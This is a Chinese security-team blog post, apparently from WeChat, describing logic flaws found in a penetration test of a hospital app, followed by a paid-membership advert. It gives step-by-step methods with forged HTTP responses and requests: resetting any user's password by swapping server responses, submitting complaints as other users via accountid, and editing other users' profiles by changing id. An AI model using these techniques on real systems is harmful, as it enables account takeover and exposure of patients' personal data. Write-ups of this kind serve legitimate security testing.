#  记某医院APP的一次逻辑漏洞挖掘   
 sec0nd安全   2025-05-05 12:07  
  
![httpsu.wechat.comMMNIFu0mUhIchBxkan0Zozgs=1.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasaAjJImJDkVXQV86YymyOYWfj3nicwJ11Jp7ySq1HjBazRjibFW7fEbWg/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "httpsu.wechat.comMMNIFu0mUhIchBxkan0Zozgs=1.png")  
  
**扫码加内部知识圈**  
  
获取漏洞资料  
  
  
  
在某次渗透测试中，对某医院的APP进行抓包测试，主要挖掘了一些逻辑漏洞，记录  
如下：  
  
抓包APP请求  
的网站地  
址，复制到网页中打开  
  
通过“找回密码”时由于只会验证返回包内容，可以抓包将返回包替换，成功重置了任意用户的密码，这会对系统正常用户的业务处理造成影响  
  
访问风险地址，输入重置的密码，手机号、证件号，然后  
首先是短信验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLU8p6q4c2ORgR1CSKOAhYEymQmSv9PkSwGic8s7rKV7ntlFmPeAhFXdQg/640?wx_fmt=png&from=appmsg "")  
  
正确的返回包应该如下：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUJMK1MgCNOMp0E1Bd3pROkmASShGbqFu1MCTFE7FB4kfvCfkweXlrZw/640?wx_fmt=png&from=appmsg "")  
  
修改mobile为系统中存在的手机号（通过信息手机获得的已经注册的病人手机号），抓取返回包替换成下面的数据包，绕过前端验证成功进入下一步验证身份证  
  
```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Access-Control-Allow-Origin: http://xxxx
Access-Control-Allow-Headers: Origin, x-requested-with, Content-Type, Accept,X-Cookie
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,POST,PUT,OPTIONS,DELETE
Content-Type: application/json;charset=UTF-8
Date: Sat, 22 Jan 2022 13:01:24 GMT
Connection: close
Content-Length: 125
 
{"msg":"验证码正确","code":1,"data":{"mobile":"xxxx","sign":"1ab261dcb1d4993abf7700e2bdbf583f","hascard":"true"}}
```  
  
身份证正确的返回包应该如下，同理抓取其他地方的成功返回包直接替换  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUbgbwe0jMsAJia9KB65ICRNA1XWu2gW0qhInqRfxAia4ibDT5Ka4oic57Fg/640?wx_fmt=png&from=appmsg "")  
  
绕过前端对证件号的验证判断，进入最后一步修改个人信息。发包，最后返回信息修改成功。此时对应手机号的密码被成功重置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUVPHian6VJnqD8cHJ5f2mnMWYIYoD1b7MGos80EQ4v88oickExEFpCEYA/640?wx_fmt=png&from=appmsg "")  
  
测试在APP和网页端都能使用重置的密码成功登陆，重置对应手机账号的密码为Aa  
123456  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLU6s0ZDW6iaGHTtPMnU7hJ82XNtIt89WRk9lEvtBufibJVXjOyickGI02AQ/640?wx_fmt=png&from=appmsg "")  
  
  
此外在APP的投诉举报处，通过修改a  
ccountid  
，可以以他人的账号身份进行投诉举报  
。  
  
通过注册登录APP，对投诉举报的提交进行抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUuKk8CSbDssjlGLdrMRQlRLc4icZI5JUo4iaNSqBtu7ZIIW59AX9V4FMA/640?wx_fmt=png&from=appmsg "")  
  
数据包如下：  
```
POST /api/authex/hpass/cloudClinic/saveComplain?t=1 HTTP/1.1
Host: xxxx
Content-Length: 187
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,en-US;q=0.9
Connection: close
 
{"accountid":"149773","demandTypeCode":"1","complaintedPsnName":"1","issueOccurDatetime":"2022-01-22 01:04","complaintTypeCode":"0","complaintTitle":"1","complaintText":"1","address":"1"}
```  
  
修改a  
ccountid  
，可以以他人账号id进行投诉  
  
此时返回结果中会返回账号的手机号、姓名、身份证号码的敏感信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUNicyLv4wq3M8oATBneFicTMk1BPwKoaAGPaDDZQ0otdia2LMj65QeZH5Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUUQDzVAXXXsZ5K4fToxT1xzo3AnAUiaicSLekPJFFP5GTP4JPkYxQavnQ/640?wx_fmt=png&from=appmsg "")  
  
  
此外还存在横向越权  
  
登陆注册一个账号，在修改信息时修改  
id值就可对不同用户进行信息修改  
  
数据包如下，指定id为其他账号的id，发包之后显示修改成功  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUnxuK3w3WTYvbv99nibsRBq1UbV9m9fIKKLcOH7Oc26okkWT2eDq9Jdw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLUENxh7cFq1Ox7wO6wAzicibC56zoicxXXia8TuHrPa6PMQPmvvpOQXkoPhg/640?wx_fmt=png&from=appmsg "")  
  
修改成功后，再点击查看完善个人信息，可以看到另外一个账号的信息被修改成功，如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTrjzN23GmKgDUe1VtN2BLU1NuQpNfOCjHhDeIdDB1RhYwHOQLTVGtK1TuzRyywZsxz05wibGvecrA/640?wx_fmt=png&from=appmsg "")  
  
验证逻辑漏洞存在  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkysic7NSibpvLZNxicl3gia2AQgicckC6D0UmMgUvPYkMGUrVO11qVoiaN5UQ/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
内部圈子介绍  
  
  
我们是C4安全团队  
，师傅们别忘了  
关注和  
点赞，团队的成长离不开你们，感谢师傅们，Ciallo～(∠・ω< )⌒★~  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkh1aPOciaQusEdbRfFxibYX9MQUfcsgzH7DaD69vsgW2HgSiceoqqrongQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
圈子专注于更新  
SRC挖掘  
/代码审计  
相关：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HaJr68L1tTTex7g7gA9hIFRAorxicicgGM4NFxNNVqAaFBL5ictHcaU9zf0zmhChIgNAvRrxUSV1l2FyI6ucawvXg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**内部圈子**  
**专栏介绍**  
  
Freebuf知识大陆内部共享资料截屏详情如下  
  
（每周保持更新）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkzvdgfFtJotO7T8dD5ATKyyeuQibDwZoltOB3Uy5nRicGDxCEpwrlRYNg/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**知识大陆——安全渗透感知大家族**  
****  
  
圈子券后现价   
￥39.9元  
  
如果你有兴趣加入，抓住机会不要犹豫，价格只会上涨，不会下跌  
  
圈子人数大于400人 69.9元/年  
  
圈子人数  
大于600人 119.9元/年  
  
（新人优惠券折扣  
20  
￥，扫码或者私信开头二维码即可领取更多优惠）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJR7GIiatmMxDnlYcGJjOmibZcd7ribwq1zichkjwIczCqhZ1zpXib3VcJpMWlSLfa6qpXwfVy6hguOXdibA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
内部圈子——  
群  
友反馈--价格优惠，内容优质  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkZXuRl4vOBsaQwJK1AbsPcGMiczaPickCuIzicPiblfFjyjic3aeuzqVLLhg/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkpxDWia5shmzQH4UialWGUCsoWYMHVpcEtUxF7RsfJaHKl9gsVWEjqAuw/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
漏洞源码圈子如下-价格固定为39.9  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT7soFia2S7F1oP7rh8ZeAwcjib4zibjfzUaQjLqIXcx6277rE9eP9fibRBBnia5neIEwnkEibNW97ia5FOw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic&wx_co=1 "")  
  
  
团队公开交流群  
  
QQ群和微信群都已建立，方便常用QQ或微信的师傅加入团队公开交流群，交流各类网安、实战方面的问题~  
  
（微信群①群已满200人，需要邀请加开头运营二维码才能加入，②群如下）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJR7GIiatmMxDnlYcGJjOmibZcndbvuc3sLTpCmoy13OG7G27MS0EJyiaKAG5l6W48rzvt67Z8umUXibAQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
